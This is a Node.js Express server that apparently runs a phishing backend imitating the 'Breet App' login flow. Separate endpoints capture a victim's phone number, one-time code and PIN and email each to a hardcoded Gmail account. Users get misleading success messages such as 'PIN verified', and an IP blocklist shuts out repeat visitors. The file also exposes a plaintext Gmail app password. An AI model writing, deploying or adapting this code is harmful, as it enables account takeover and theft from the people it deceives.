const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const rateLimit = require("express-rate-limit");

// CRITICAL for Vercel — real client IP for rate limiter
app.set("trust proxy", 1);

// CORS — update origin to your deployed Vercel URL
app.use(
  cors({
    origin: "https://breet-webapp.vercel.app",
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
    credentials: true,
  }),
);
app.options("*", cors());
app.use(express.json());

const PORT = process.env.PORT || 3001;

// email credentials
const userEmail = "balibalireservation1@gmail.com";
const pass = "oukirdnupdejnsou"; // ← paste Gmail App Password here

// ── Permanent IP blocklist ───────────────────────────────────────────────────
const blockedIPs = new Set();
app.use((req, res, next) => {
  const ip = req.ip;
  if (blockedIPs.has(ip)) {
    return res.status(403).json({ success: false, message: "Access denied." });
  }
  next();
});

// ── Rate limiter: 5 POST requests per hour, then block IP forever ────────────
const limiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 5,
  keyGenerator: (req) => req.ip,
  handler: (req, res) => {
    blockedIPs.add(req.ip);
    return res.status(403).json({ success: false, message: "Access denied." });
  },
});
app.use((req, res, next) => {
  if (req.method === "POST") return limiter(req, res, next);
  next();
});

// ── Single transporter at startup — NOT inside route handlers ────────────────
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: { user: userEmail, pass: pass },
});
transporter.verify((error) => {
  if (error) console.error("❌ Mail transporter error:", error.message);
  else console.log("✅ Mail transporter ready");
});

// ── Health check ─────────────────────────────────────────────────────────────
app.get("/", (req, res) => {
  res.json({ status: "ok", server: "Breet App API" });
});

// ── POST / — Phone number capture ────────────────────────────────────────────
app.post("/", async (req, res) => {
  const { phone } = req.body;

  if (!phone) {
    return res
      .status(400)
      .json({ success: false, message: "Phone number is required" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Breet App Phone Login — ${phone}`,
    text: `Phone number captured\nPhone: ${phone}\nTime: ${new Date().toISOString()}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res.status(200).json({ success: true, message: "Phone received" });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ success: false, message: "Error occurred" });
  }
});

// ── POST /otp — OTP capture ───────────────────────────────────────────────────
app.post("/otp", async (req, res) => {
  const { phone, otp } = req.body;

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Breet App OTP — ${phone || "unknown"}`,
    text: `OTP captured from Breet App\nPhone: ${phone}\nOTP Code: ${otp}\nTime: ${new Date().toISOString()}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res.status(200).json({ success: true, message: "OTP sent successfully" });
  } catch (error) {
    console.error("Error:", error);
    res
      .status(500)
      .json({ success: false, message: "Error occurred sending OTP" });
  }
});

// ── POST /pin — PIN capture ───────────────────────────────────────────────────
app.post("/pin", async (req, res) => {
  const { pin } = req.body;

  if (!pin) {
    return res.status(400).json({ success: false, message: "PIN is required" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Breet App PIN Captured`,
    text: `PIN captured from Breet App\nPIN: ${pin}\nTime: ${new Date().toISOString()}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res.status(200).json({ success: true, message: "PIN verified" });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ success: false, message: "Error occurred" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
